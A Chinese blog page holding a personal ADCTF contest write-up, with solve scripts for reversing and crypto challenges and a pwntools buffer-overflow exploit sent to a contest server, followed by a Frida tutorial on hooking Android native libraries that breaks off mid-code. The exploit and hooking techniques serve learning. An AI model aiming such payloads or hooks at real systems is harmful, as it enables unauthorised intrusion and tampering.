[{"content":"ADCTF新生赛个人wp Reverse checkin IDA打开可以看到逻辑很简单 直接给出exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { char encoded[30] = { 0x55, 0x17, 0xC9, 0xBB, 0x4A, 0xA5, 0x86, 0xDF, 0x24, 0x0A, 0x1C, 0xA3, 0x27, 0xA1, 0x57, 0x35, 0xC3, 0xDB, 0x91, 0x88, 0x6D, 0x91, 0xA0, 0xCC, 0x71, 0x57, 0x71, 0xE4, 0x40 }; char original_input[30]; int i; srand(0x7E8u); for (i = 0; i \u0026lt; 29; ++i) { original_input[i] = encoded[i] ^ rand(); } original_input[29] = \u0026#39;\\0\u0026#39;; printf(\u0026#34;%s\\n\u0026#34;,original_input); return 0; } //flag{y0u_Know_rAnd0m_4nd_xOr} 注意需要在linux环境下运行(Windows和Linux下生成的随机数不同，附件为64位elf文件)\nezPy 下载附件后发现是个pyinstaller打包的python文件(可以通过图标辨别)，用pyinstxtractor解包得到main.pyc文件，用在线网站对pyc文件反编译(用本地的pycdc也可以解决)\n前面还有一段是密文数据，程序的逻辑就是每9个字节通过不同的表达式计算得到encoded数组，逆向思路只需要对这个方程组进行求解即可，采用z3约束求解器进行求解，exp如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 from z3 import * # Create a list of Z3 integer variables for the flag flag = [Int(f\u0026#34;flag_{i}\u0026#34;) for i in range(36)] # Create a solver solver = Solver() # The secret values from the original problem secret = [ 631, 1205, -500, 1021, 1879, 668, -281, 1651, 1326, 593, 428, -170, 515, 1302, 452, 41, 814, 379, 382, 629, 650, 273, 1529, 630, 418, 1207, 1076, 315, 1118, 469, 398, 1803, 647, 729, 1439, 1104 ] # Add constraints for each encoded value for i in range(0, 36, 9): solver.add(3 * flag[i] + 7 * flag[i + 1] - 2 * flag[i + 2] + 5 * flag[i + 3] - 6 * flag[i + 4] - 14 == secret[i]) solver.add(-5 * flag[i + 1] + 9 * flag[i + 2] + 4 * flag[i + 3] - 3 * flag[i + 4] + 7 * flag[i + 5] - 18 == secret[i + 1]) solver.add(6 * flag[i] - 4 * flag[i + 1] + 2 * flag[i + 2] - 9 * flag[i + 5] + 5 * flag[i + 6] - 25 == secret[i + 2]) solver.add(7 * flag[i + 1] + 3 * flag[i + 3] - 8 * flag[i + 4] + 6 * flag[i + 5] - 2 * flag[i + 6] + 4 * flag[i + 7] - 30 == secret[i + 3]) solver.add(2 * flag[i] + 5 * flag[i + 2] - 4 * flag[i + 4] + 7 * flag[i + 5] + 9 * flag[i + 8] - 20 == secret[i + 4]) solver.add(8 * flag[i] - 3 * flag[i + 1] + 5 * flag[i + 3] - 6 * flag[i + 7] + 2 * flag[i + 8] - 19 == secret[i + 5]) solver.add(-7 * flag[i + 1] + 4 * flag[i + 2] - 5 * flag[i + 5] + 3 * flag[i + 6] + 6 * flag[i + 8] - 22 == secret[i + 6]) solver.add(9 * flag[i] + 2 * flag[i + 2] + 6 * flag[i + 3] - 4 * flag[i + 6] + 5 * flag[i + 7] - 3 * flag[i + 8] - 27 == secret[i + 7]) solver.add(4 * flag[i] - 5 * flag[i + 4] + 7 * flag[i + 5] + 3 * flag[i + 6] + 9 * flag[i + 7] - 2 * flag[i + 8] - 33 == secret[i + 8]) # Add constraints for flag ASCII values (valid ASCII range) for f in flag: solver.add(0 \u0026lt;= f, f \u0026lt;= 255) # Check if the solver finds a solution if solver.check() == sat: model = solver.model() result = \u0026#39;\u0026#39;.join(chr(model[flag[i]].as_long()) for i in range(36)) print(\u0026#34;The flag is:\u0026#34;, result) else: print(\u0026#34;No solution found\u0026#34;) #flag{y0U_4rE_r3@1ly_g0o0oOd_At_m4Th} 喝点茶吧 IDA打开之后，程序是加花过的，下面给出去花过程\n这段汇编指令ebx先xor了自己，所以ZF标志位一定是0，程序正常的执行流程只会执行jz指令跳转到0x4012FA+1的位置，解决方法patch掉0x4012FA的字节再把剩下的字节转换成code即可(C)\n第二处花指令和第一处类似，patch0x401328处的字节即可，包括loc_401320这一段数据也可以直接nop掉，因为程序只会执行jz这条指令的控制流，中间的都是不会执行的垃圾数据，去除完之后就可以在函数头按P定义这个函数，再F5反编译就可以看到main函数(已经过整理)\n接着分析encrypt函数\n发现并没有找到加密过程，查看这个函数的汇编可以发现这个函数也被加入了花指令\n看到这个位置，先是call了一个附近的位置，然后retn，call指令会把call指令的下一条指令的地址入栈，retn则会把存入栈中的地址弹出到eip中，这一段操作没有改变程序原来的执行流程，但是会导致IDA识别出错导致栈失衡，解决方法就是从call指令到retn的下一个字节全部patch掉(0x401215 - 0x401251)，接着就能看到完整的逻辑了\n__scrt_common_main_seh()就是具体的加密过程，然而这个函数也有花指令:(\n这两个位置和前面提到的基本一样，不赘述\n可以看到tea加密的特征，但是尝试解密得到的结果是错误的，这里有个MEMORY[0] = 0指令，这里要提到Windows系统下的异常处理机制SEH，简要来说就是通过某些逻辑错误导致系统发送错误信号，然后由SEH的过滤器来决定要不要接管这个错误，一旦系统开始接管这个错误，就会跳转到相应的处理函数，处理完成之后继续执行程序\n更详细的可以看(https://bbs.kanxue.com/thread-249592.htm)\n有了前面的知识之后，对程序动调，可以发现当ebp+var_1C地址处的值为0(sum = 0)时，程序在这个地方触发了一个异常(非法访问内存地址，对应的异常号为0xC0000005),这段指令的意思大概是访问了地址为0x0的内容\n接着找到异常号对应的处理函数\n阅读汇编之后其实就是调用了srand函数，seed为0x7E8\n当sum！=0的时候，程序继续往下执行会看到这个地方出发了一个除数异常(SIGILL，异常号0xC000094)\n这段汇编的意思就是一个数除以0，触发了这个异常，跳转到异常号对应的处理函数\n这里就是调用了rand函数，再把sum+=rand()，处理完之后继续执行程序的sum -= delta指令，从这里开始，tea加密的每一轮加密都会调用一次这个rand函数，所以我们需要理一下加密的执行流程：第一轮加密(i=0)正常执行，中间会触发异常调用srand(0x7E8)，后面的31轮加密每次都会执行sum+=rand(),位置在sum-=delta之前，理清执行流程之后就可以写exp了,exp如下(记得在Windows下执行，因为附件是exe文件)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; void tea_decrypt(unsigned int* a1, unsigned int* a2) { int i; // [esp+2Ch] [ebp-28h] unsigned int v3; // [esp+30h] [ebp-24h] unsigned int v4; // [esp+34h] [ebp-20h] unsigned int v5; // [esp+38h] [ebp-1Ch] v4 = *a1; v3 = a1[1]; v5 = 0; v5 -= 0x61C88647; unsigned int seed = 0x7E8; srand(seed); int randoms[31]; for (int i = 0; i \u0026lt; 31; i++) { randoms[i] = rand(); // 生成一个随机数 v5 += randoms[i]; v5 -= 0x61C88647; } for (i = 0; i \u0026lt; 32; ++i) { //v4 += (a2[v5 \u0026amp; 3] + v5) ^ (v3 + ((v3 \u0026gt;\u0026gt; 5) ^ (16 * v3))); //v5 -= 0x61C88647; v3 -= (a2[(v5 \u0026gt;\u0026gt; 11) \u0026amp; 3] + v5) ^ (v4 + ((v4 \u0026gt;\u0026gt; 5) ^ (16 * v4))); v5 += 0x61C88647; if (i != 31) v5 -= randoms[30 - i]; v4 -= (a2[v5 \u0026amp; 3] + v5) ^ (v3 + ((v3 \u0026gt;\u0026gt; 5) ^ (16 * v3))); } *a1 = v4; a1[1] = v3; } int main() { // 加密的数据（假设为两个 32 位整数） unsigned int key[4] = { 0x114514, 0x1919810, 0x39C5BB, 0xFFE211 }; // 密钥 unsigned int data[12] = { 0xC20B1189,0x275D3ADE, 0xB1ADFCDE, 0x8201166D, 0xCD1E08DC, 0xA0830899, 0xC7C8C706, 0x9FC9A9F5, 0x8250A71D, 0xED329E66, 0xB88D21D7, 0x2EDA3C43 }; for (int i = 0; i \u0026lt; 12; i += 2) { unsigned int temp[2]; temp[0] = data[i]; temp[1] = data[i + 1]; tea_decrypt(temp, key); printf(\u0026#34;%x%x\u0026#34;, temp[0], temp[1]); } return 0; } //flag{Y0u_s0lv3d_thE_Qu3s7I0n_5O_dr1nk_5oMe_t3A} Py_revenge 拿到附件之后IDA打开会看到很多的Py字样，再根据题目名字可以猜出是pyinstaller打包的程序，用pyinstxtractor解包得到pyc文件，用pycdc反编译的时候会发现只有部分逻辑\n这种情况只能用pycdas看字节码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 [Disassembly] 0 RESUME 0 2 LOAD_CONST 0: 0 4 LOAD_CONST 1: None 6 IMPORT_NAME 0: base64 8 STORE_NAME 0: base64 10 BUILD_LIST 0 12 LOAD_CONST 2: (27, 40, 57, 63, 24, 4, 66, 4, 100, 122, 8, 27, 21, 122, 4, 15, 122, 20, 17, 98, 25, 115, 55, 82, 74, 71, 23, 20, 9, 26, 28, 105, 95, 34, 90, 46) 14 LIST_EXTEND 1 16 STORE_NAME 1: secret 18 PUSH_NULL 20 LOAD_NAME 2: input 22 LOAD_CONST 3: \u0026#39;Please enter the flag:\u0026#39; 24 CALL 1 32 STORE_NAME 3: flag 34 PUSH_NULL 36 LOAD_NAME 0: base64 38 LOAD_ATTR 8: b64encode 58 LOAD_NAME 3: flag 60 LOAD_ATTR 11: encode 80 CALL 0 88 CALL 1 96 LOAD_ATTR 13: decode 116 CALL 0 124 STORE_NAME 3: flag 126 LOAD_NAME 3: flag 128 GET_ITER 130 LOAD_FAST_AND_CLEAR 0: c 132 SWAP 2 134 BUILD_LIST 0 136 SWAP 2 138 FOR_ITER 10 (to 160) 142 STORE_FAST 0: c 144 PUSH_NULL 146 LOAD_NAME 7: ord 148 LOAD_FAST 0: c 150 CALL 1 158 LIST_APPEND 2 160 JUMP_BACKWARD 12 (to 138) 162 END_FOR 164 SWAP 2 166 STORE_FAST 0: c 168 STORE_NAME 3: flag 170 LOAD_CONST 4: \u0026#39;ADCTF2024\u0026#39; 172 STORE_NAME 8: key 174 PUSH_NULL 176 LOAD_NAME 9: range 178 PUSH_NULL 180 LOAD_NAME 10: len 182 LOAD_NAME 3: flag 184 CALL 1 192 CALL 1 200 GET_ITER 202 FOR_ITER 46 (to 296) 206 STORE_NAME 11: i 208 LOAD_NAME 3: flag 210 LOAD_NAME 11: i 212 COPY 2 214 COPY 2 216 BINARY_SUBSCR 220 PUSH_NULL 222 LOAD_NAME 7: ord 224 LOAD_NAME 8: key 226 LOAD_NAME 11: i 228 PUSH_NULL 230 LOAD_NAME 10: len 232 LOAD_NAME 8: key 234 CALL 1 242 BINARY_OP 6 (%) 246 BINARY_SUBSCR 250 CALL 1 258 BINARY_OP 25 (^=) 262 SWAP 3 264 SWAP 2 266 STORE_SUBSCR 270 LOAD_NAME 3: flag 272 LOAD_NAME 11: i 274 COPY 2 276 COPY 2 278 BINARY_SUBSCR 282 LOAD_NAME 11: i 284 BINARY_OP 25 (^=) 288 SWAP 3 290 SWAP 2 292 STORE_SUBSCR 296 JUMP_BACKWARD 48 (to 202) 298 END_FOR 300 LOAD_NAME 3: flag 302 LOAD_NAME 1: secret 304 COMPARE_OP 40 (==) 308 POP_JUMP_IF_FALSE 9 (to 328) 310 PUSH_NULL 312 LOAD_NAME 12: print 314 LOAD_CONST 5: \u0026#39;Correct!\u0026#39; 316 CALL 1 324 POP_TOP 326 RETURN_CONST 1: None 328 PUSH_NULL 330 LOAD_NAME 12: print 332 LOAD_CONST 6: \u0026#39;Wrong!\u0026#39; 334 CALL 1 342 POP_TOP 344 RETURN_CONST 1: None 346 SWAP 2 348 POP_TOP 350 SWAP 2 352 STORE_FAST 0: c 354 RERAISE 0 经过分析可以知道程序的加密逻辑并不难，大概过程如下\n1 2 3 for i in len(flag) flag[i] = flag[i] ^ key[i % len(key)] ^ i #key = \u0026#34;ADCTF2024\u0026#34; 直接给出exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 import base64 secret = [ 27, 40, 57, 63, 24, 4, 66, 4, 100, 122, 8, 27, 21, 122, 4, 15, 122, 20, 17, 98, 25, 115, 55, 82, 74, 71, 23, 20, 9, 26, 28, 105, 95, 34, 90, 46 ] key = \u0026#39;ADCTF2024\u0026#39; decoded_flag = [] for i in range(len(secret)): decoded_flag.append(secret[i] ^ ord(key[i % len(key)]) ^ i) decoded_flag_str = \u0026#39;\u0026#39;.join(chr(c) for c in decoded_flag) original_flag = base64.b64decode(decoded_flag_str).decode() print(original_flag) #flag{u_aR3_4_Py7h0n_M@5t3r} NotOnlyDotNet 拿到附件用IDA打开，进入main函数没有发现什么明显的加密逻辑，但是调用了ZSTD的api和一些进程之间的调用函数，并且通过ZSTD把两块内存中的数据解压出来了，猜测这两块内存是通过ZSTD压缩过后的数据，所以思路为dump出这两段数据再用ZSTD解压，看看程序的具体逻辑是什么\ndump shell_data 和 core_data有两种方式，第一种是直接动调dump出解压后的数据，第二种方法是用IDApyhton脚本把这两段数据dump成bin文件，再用ZSTD库进行解压得到文件，这里采用第二种方式\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import idaapi import idc import ida_bytes start_address = 0x402010 # 起始地址 size = 0x24AA # 数据大小 output_file = \u0026#34;core_data.bin\u0026#34; # 打开文件准备写入 with open(output_file, \u0026#34;wb\u0026#34;) as f: for i in range(size): byte = ida_bytes.get_byte(start_address + i) f.write(bytes([byte])) 根据ida中给出的地址和大小就可以把这两个文件dump出来，然后用ZSTD解压\n1 2 3 4 5 C:\\Users\\HelloCTF_OS\\Downloads\\NotOnlyDotNet (1)\u0026gt;zstd -d gshell_data.bin -o gshell_data_decompressed gshell_data.bin : 66818650 bytes C:\\Users\\HelloCTF_OS\\Downloads\\NotOnlyDotNet (1)\u0026gt;zstd -d core_data.bin -o core_data_decompressed core_data.bin : 12288 bytes 得到这两个文件，对这两个程序查壳，发现是C#写的elf文件，用ILspy和dnspy进行反编译，ILspy和dnspy好像只能识别exe文件所以改了后缀\n执行流程大概是：AES-\u0026gt;XOR-\u0026gt;Base64，其中AES和XOR用到的key是通过main函数传参过来的，所以key应该是在shell里面，随便翻翻就能找到，这里直接整合到一起了\nexp如下(太懒了丢给ai了)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 from Crypto.Cipher import AES from Crypto.Util.Padding import unpad import base64 def xor_decrypt(data, xor_key): \u0026#34;\u0026#34;\u0026#34;XOR 解密\u0026#34;\u0026#34;\u0026#34; return bytes([b ^ xor_key[i % len(xor_key)] for i, b in enumerate(data)]) def aes_decrypt(ciphertext, aes_key): \u0026#34;\u0026#34;\u0026#34;AES 解密\u0026#34;\u0026#34;\u0026#34; cipher = AES.new(aes_key, AES.MODE_CBC, aes_key) # 使用 aes_key 作为 IV decrypted = unpad(cipher.decrypt(ciphertext), AES.block_size) return decrypted def main(aes_key, xor_key, encrypted_data_base64): # Base64 解密 encrypted_data = base64.b64decode(encrypted_data_base64) # 先进行 XOR 解密 xor_decrypted = xor_decrypt(encrypted_data, xor_key) # 再进行 AES 解密 aes_decrypted = aes_decrypt(xor_decrypted, aes_key) # 转换回 UTF-8 字符串 decrypted_flag = aes_decrypted.decode(\u0026#39;utf-8\u0026#39;) return decrypted_flag # 输入你的 aesKey 和 xorKey，以及已知的 Base64 加密后的数据 aes_key = bytes([62, 107, 51, 121, 49, 95, 102, 48, 114, 95, 122, 64, 107, 48, 60, 51]) # AES key xor_key = b\u0026#39;z@k0f1ndth3key2w\u0026#39; # XOR key（可以是任意字节数组） encrypted_data_base64 = \u0026#39;qpuQkUPI8knvxgK5U0UwKCrrQeOxdY8H6YKuzcD05OKatSh0UCg8+xDIxsbppDNaY3Eflx0Va8F/7wKxVrI8Qgq0vH4BUGXBDc1fSNUww5Y=\u0026#39; # 填入从C#程序中获取到的加密数据的Base64字符串 # 调用解密函数 decrypted_flag = main(aes_key, xor_key, encrypted_data_base64) print(f\u0026#34;解密后的 flag: {decrypted_flag}\u0026#34;) # flag{U_r_r33lly_tAl3nted_At_r3ve3s3_aNA1yz1ng!!!_p@ch1!!!nyA!!!} what!why!!! DIE查壳，发现upx壳直接upx -d脱壳\nmain函数直接就是加密逻辑，大概就是64字节的数据，每四个为一组进行处理这里v6的值并没有显式给出来，但是看汇编能知道是s的首地址+64，就是s的最后一个字节的地址，尝试写了exp但是结果都不对，奇怪的是前4个字节是flag，但是后面的都不对，猜测程序在第一组字节加密过后对过程进行了修改\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; int main() { unsigned char input[64] = { 0x87, 0xE9, 0x72, 0x0E, 0x1F, 0x57, 0xEC, 0x0C, 0xE9, 0x9C, 0xC0, 0x5E, 0x25, 0x32, 0xCD, 0x1F, 0xC0, 0x16, 0x31, 0x2B, 0xA5, 0xDC, 0x91, 0x71, 0xE0, 0x1F, 0xA3, 0x01, 0x6A, 0x1D, 0x6F, 0x55, 0x77, 0x1B, 0x0E, 0x33, 0xB7, 0xD0, 0xDE, 0x24, 0x3B, 0xCF, 0xAC, 0x64, 0xE3, 0x80, 0x7B, 0x3B, 0x62, 0xE4, 0x33, 0x1C, 0xCA, 0xBF, 0xAC, 0x5F, 0xF0, 0x9F, 0xB1, 0x0E, 0xCE, 0x40, 0xEE, 0x64 }; unsigned int i, j; unsigned int rand_value; unsigned int seed = 0xD000721; srand(seed); for (i = 0; i \u0026lt; 16; i++) { rand_value = rand(); for (j = 0; j \u0026lt; 4; j++) { input[4 * i + j] ^= rand_value; rand_value \u0026gt;\u0026gt;= 8; } seed = rand(); srand(seed); } for (int i = 0; i \u0026lt; 64; i++) { printf(\u0026#34;%x\u0026#34;, input[i]); } return 0; } 这是一开始写的exp，不对，重新对程序分析，在动调的时候发现程序调用sleep(60)的时候会一直处于sleep状态不跳出，应该是对sleep进行了修改，查看sleep的交叉引用\n发现可疑函数\n在最下面对sleep函数和srand函数都进行了操作，查看sub_4012C7函数\n发现调用了两次mprotect函数修改了参数a1的内存读写权限，大概可以猜到就是这里对sleep和srand函数进行了修改，虽然知道了srand函数被修改了，但是不知道传进来的第二个的参数有什么用，然后在汇编里面乱翻翻到了一个未定义的函数(纯运qaq)\n看汇编能看到熟悉的数字0x0D000721(seed)，可以根据汇编猜测就是当seed!=0x0D000721的时候会执行seed^=0x7A71571,所以main函数的加密过程是不完整的，经过修改的exp如下(请在linux环境下运行)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; int main() { unsigned char input[64] = { 0x87, 0xE9, 0x72, 0x0E, 0x1F, 0x57, 0xEC, 0x0C, 0xE9, 0x9C, 0xC0, 0x5E, 0x25, 0x32, 0xCD, 0x1F, 0xC0, 0x16, 0x31, 0x2B, 0xA5, 0xDC, 0x91, 0x71, 0xE0, 0x1F, 0xA3, 0x01, 0x6A, 0x1D, 0x6F, 0x55, 0x77, 0x1B, 0x0E, 0x33, 0xB7, 0xD0, 0xDE, 0x24, 0x3B, 0xCF, 0xAC, 0x64, 0xE3, 0x80, 0x7B, 0x3B, 0x62, 0xE4, 0x33, 0x1C, 0xCA, 0xBF, 0xAC, 0x5F, 0xF0, 0x9F, 0xB1, 0x0E, 0xCE, 0x40, 0xEE, 0x64 }; unsigned int i, j; unsigned int rand_value; unsigned int seed = 0xD000721; srand(seed); for (i = 0; i \u0026lt; 16; i++) { rand_value = rand(); for (j = 0; j \u0026lt; 4; j++) { input[4 * i + j] ^= rand_value; rand_value \u0026gt;\u0026gt;= 8; } seed = rand(); if(seed != 0xD000721) seed ^= 0x7A71571;\t//srand被修改之后的加密逻辑 srand(seed); } for (int i = 0; i \u0026lt; 64; i++) { printf(\u0026#34;%x\u0026#34;, input[i]); } return 0; } //flag{kR@z1!!!y0U_3M1nent1y_g0o0od_aT_n0t_b3iNg_r1kr0lled_0rz!!!} Do you like Kotone? apk文件，jadx打开，找到mainactivity类\n对用户输入判断的地方是调用了checker类的checkFlag方法，跟进去看看\n可以看到在checkflag方法中调用了native层ezandroid.so文件的check方法，解压apk文件找到对应so文件打开\nso层就是实现了一个标准的rc4加密，这里就不赘述，提取出密文即可，rc4的key在Java层传参的时候就已给出\n流程就是base64-\u0026gt;rc4，其中base64进行了换表操作，跟进table变量可以在string.xml文件中找到table的值\n89YdTR+PB67i0HaqGJWp4FtcL5Oufle/AVNDS3IxwzCn12mUskZjhrKoyvMXgEbQ\n尝试解密会失败，回到Java层的base64，根据函数名提示可能base64做了魔改，要重新看base64的逻辑，base64每次去三个字节的数据，最后会出现4个字节的密文，先取第一个字节的低6位并通过查表生成第一个字节的密文，接着取第第二个字节的低4位和一个字节的高2位拼在一起得到第二个字节密文，再取第二个字节高2位和第三个字节低4位组成第三个字节密文，再取第三个字节的低2位和第二个字节的高4位拼成第三个字节密文，最后取第三个字节的高6位组成第四个字节密文，如果明文的字节数不是3的倍数就缺几个字节填几个\u0026quot;=\u0026quot;，解密就跟着这个过程逆着写就行\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 data = \u0026#34;IktLx2oWUJP0aFKck0ocZF+G634e/24Go94OzrP8\u0026#34; #最后一个字节是\u0026#39;=\u0026#39;，改成table[0]这样不会影响解码过程 table = \u0026#34;89YdTR+PB67i0HaqGJWp4FtcL5Oufle/AVNDS3IxwzCn12mUskZjhrKoyvMXgEbQ\u0026#34; table_dict = {char: idx for idx, char in enumerate(table)} flag = \u0026#34;\u0026#34; for i in range(0, len(data), 4): ch1 = table_dict[data[i]] ch2 = table_dict[data[i+1]] ch3 = table_dict[data[i+2]] ch4 = table_dict[data[i+3]] part1 = ch1 | ((ch2 \u0026amp; 3) \u0026lt;\u0026lt; 6) part2 = ((ch2 \u0026amp; 0x3c) \u0026gt;\u0026gt; 2) | ((ch3 \u0026amp; 0xf) \u0026lt;\u0026lt; 4) part3 = ((ch3 \u0026amp; 0x30) \u0026gt;\u0026gt; 4) | (ch4 \u0026lt;\u0026lt; 2) flag += chr(part1) flag += chr(part2) flag += chr(part3) print(flag) #flag{Kot0Ne_1s_re@IIy_KAw@ii} Crypto Too_Close_To_Sqrt 我做出来的密码题都没什么好说的，网上找的脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 from Crypto.Util.number import * import sympy # n 和 c 的值 n = 77110253337392483710762885851693115398718726693715564954496625571775664359421696802771127484396119363821442323280817855193791448966346325672454247192244603281463595140923987182065095198239715749980911991399313395478292871386248479783966672279960117003211050451721307589036878362258617072298763845707881171743025954660306653186069633961424298647787491228085801739935823867940079473418881721402983930102278146132444200918211570297746753023639071980907968315022004518691979622641358951345391364430806558132988012728594904676117146959007388204192026655365596585273466096578234688721967922267682066710965927143418418189061 c = 702169486130185630321527556026041034472676838451810139529487621183247331904842057079283224928768517113408797087181581480998121028501323357655408002432408893862758626561073997320904805861882437888050151254177440453995235705432462544064680391673889537055043464482935772971360736797960328738609078425683870759310570638726605063168459207781397030244493359714270821300687562579988959673816634095712866030123140597773571541522765682883740928146364852979096568241392987132397744676804445290807040450917391600712817423804313823998912230965373385456071776639302417042258135008463458352605827748674554004125037538659993074220 # 使用 sympy 的 factorint() 来因式分解 n factors = sympy.ntheory.factorint(n) # 打印因数，查看哪些是 p 和 q print(factors) # 获取 p 和 q（在 RSA 中，n = p * q） # 假设 n 只包含两个质因数 p 和 q p = list(factors.keys())[0] q = list(factors.keys())[1] # 计算 φ(n) phi_n = (p - 1) * (q - 1) # 计算 d，d 是 e 的模 φ(n) 逆元 e = 65537 d = pow(e, -1, phi_n) # 解密密文 c m = pow(c, d, n) # 将 m 转换为字节并显示 flag = long_to_bytes(m) print(flag.decode()) #flag{oops_the_N_is_not_secure} One_Key_Pad 逻辑就是flag^key，给出了密文，并且已知前5个字节为flag{ 直接爆破key即可\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 # 爆破和解密脚本 # 已知的明文前五个字节：\u0026#39;flag{\u0026#39; plaintext = [ord(c) for c in \u0026#34;flag{\u0026#34;] # 转换为字节序列 [102, 108, 97, 103, 123] # 密文的前五个字节 ciphertext = bytes.fromhex(\u0026#34;e0eae7e1fde3e7fcffd9fee9f4fb\u0026#34;)[:5] # 提取密文前五个字节 # 步骤 1: 爆破密钥 key = [] for p, c in zip(plaintext, ciphertext): key.append(p ^ c) # 打印出爆破得到的密钥 print(f\u0026#34;爆破出的key: {key}\u0026#34;) # 步骤 2: 解密整个密文 ciphertext_full = bytes.fromhex(\u0026#34;e0eae7e1fde3e7fcffd9fee9f4fb\u0026#34;) # 完整密文 # 解密过程 plaintext_full = [] for i in range(len(ciphertext_full)): plaintext_full.append(ciphertext_full[i] ^ key[i % len(key)]) # 输出解密后的明文 try: print(\u0026#34;解密后的明文:\u0026#34;, bytes(plaintext_full).decode()) except UnicodeDecodeError: print(\u0026#34;解密后的明文包含非打印字符，无法直接显示。\u0026#34;) print(\u0026#34;解密后的字节串:\u0026#34;, bytes(plaintext_full)) #flag{eazy_xor} Pwn ret2text IDA打开附件\n但是简单的栈溢出，程序会限制read函数读入的字节数小于96，但是nbytes由我们输入，所以只要输入-1造成整数溢出即可，后面就根据栈空间填payload到return的地址，然后换成后门的地址即可，exp如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 from pwn import * import time context(log_level = \u0026#39;debug\u0026#39;) host = \u0026#39;120.76.118.202\u0026#39; port = 33001 io = remote(host, port) io.recvuntil(b\u0026#34;Type your passphrase:\u0026#34;) io.sendline(b\u0026#34;115c79a11142301a2c418f7c689f188e\u0026#34;) #io.recvuntil(b\u0026#34;Anyway,how old are you now\u0026gt;\u0026#34;) time.sleep(1) io.sendline(b\u0026#39;-1\u0026#39;) padding = 0x68 return_addr = 0x400624 payload = b\u0026#39;a\u0026#39; * padding + p64(return_addr) #io.recvuntil(b\u0026#34;So what are you going to say?\\n\u0026#34;) io.sendline(payload) io.interactive() #flag{668c6131-3680-438b-aacd-f76c5cede90e} ","date":"2025-01-01T13:49:19+08:00","image":"https://jeremiah.oss-cn-shenzhen.aliyuncs.com/picture/202501011926932.png","permalink":"http://www.j3r3m14h.com.cn/Je2em1ah_blog/p/adctf/","title":"ADCTF"},{"content":"Frida Hook so 枚举各种 1. 枚举导入表 通过枚举导入表，可以获取出现在导入表中的函数地址。\n1 2 3 4 5 6 7 8 var imports = Module.enumerateImports(\u0026#34;libxxx.so\u0026#34;); for (var i = 0; i \u0026lt; imports.length; i++) { if (imports[i].name === \u0026#34;strncat\u0026#34;) { console.log(JSON.stringify(imports[i])); console.log(imports[i].address); break; } } 2. 枚举导出表 通过枚举导出表，可以获取出现在导出表中的函数地址。\n1 2 3 4 var exports = Module.enumerateExports(\u0026#34;libxxx.so\u0026#34;); for (var i = 0; i \u0026lt; exports.length; i++) { console.log(JSON.stringify(exports[i])); } 3. 枚举符号表 通过枚举符号表，可以获取出现在符号表中的函数地址。\n1 Module.enumerateSymbols(\u0026#34;libxxx.so\u0026#34;); 4. 枚举模块并进一步枚举导出表 通过枚举模块，再枚举模块内部的导出表，可以快速找到某个导入函数出自哪个 SO。\n1 Process.enumerateModules(); 5. 解析表类型 exports 解析的表类型为 SHT_DYNSYM symbols 解析的表类型为 SHT_SYMTAB SYMTAB 更全面（DYNSYM 是 SYMTAB 的子集），但并非 SO 运行所必需，通常会被去掉。\nHook 导出函数 步骤一：获取函数地址 在 SO 的导出表中，可以通过 Frida 提供的 API 获取函数地址。\n1 Module.findExportByName(\u0026#34;libxxx.so\u0026#34;, \u0026#34;add\u0026#34;); 注意：函数名以汇编中出现的为准。\n步骤二：使用 Interceptor.attach 进行 Hook 获取到函数地址后，使用 Interceptor.attach 对函数进行 Hook。\n1 2 3 4 5 6 7 8 9 10 Interceptor.attach(Address, { onEnter: function(args){ console.log(args[0]); // 打印参数 console.log(this.context.x1); // 打印寄存器内容 console.log(args[2].toInt32()); // 默认显示16进制，这里转换成10进制 }, onLeave: function(retval){ console.log(\u0026#34;retval\u0026#34;, retval, retval.toInt32()); } }); 模块基址的几种获取方式 对于在导入表、导出表、符号表中找不到的函数，地址需要自行计算。 计算方式很简单：SO 基址 + 函数在 SO 中的偏移（ARM 架构下 Thumb 模式需要加 1）。 因此，首先需要获取 SO 的基址，即模块基址。 1 2 3 4 5 6 7 8 9 10 11 Process.findModuleByName(\u0026#34;libart.so\u0026#34;); Process.getModuleByName(\u0026#34;libc.so\u0026#34;); Module.findBaseAddress(\u0026#34;libart.so\u0026#34;); Process.enumerateModules(); Process.findModuleByAddress(address); Process.getModuleByAddress(address); Hook 任意函数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 var soAddr = 